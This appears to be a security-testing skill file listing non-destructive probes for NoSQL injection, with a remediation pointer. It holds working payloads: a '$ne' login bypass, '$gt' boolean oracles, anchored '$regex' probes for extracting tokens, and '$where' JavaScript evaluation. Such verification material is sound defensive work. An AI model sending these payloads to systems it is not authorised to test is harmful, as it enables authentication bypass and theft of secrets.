# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`nosql-injection`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `nosql-injection`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Scalar-to-operator authentication differential

**Expected differential:** replacing a scalar password with an operator object flips the login from fail to success, while the scalar control fails

```text
{"username":"realuser","password":{"$ne":null}}
{"username":"realuser","password":"wrongpass"}
```

### Boolean match-count oracle

**Expected differential:** a true comparison operator matches the baseline document set while a false one empties it

```text
age[$gt]=0 (true branch)
age[$gt]=999999 (false branch)
```

### Blind regex extraction oracle

**Expected differential:** an anchored regex that matches only when the first field character is a distinguishes itself from a non-matching prefix

```text
token[$regex]=^a (prefix probe)
token[$regex]=^zzzz (non-matching control)
```

### Server-side JavaScript reachability (non-blocking)

**Expected differential:** a $where expression true for all documents changes the count versus one that is false, proving evaluation without a blocking loop

```text
{"$where":"this.a==this.a"}
{"$where":"this.a!=this.a"}
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
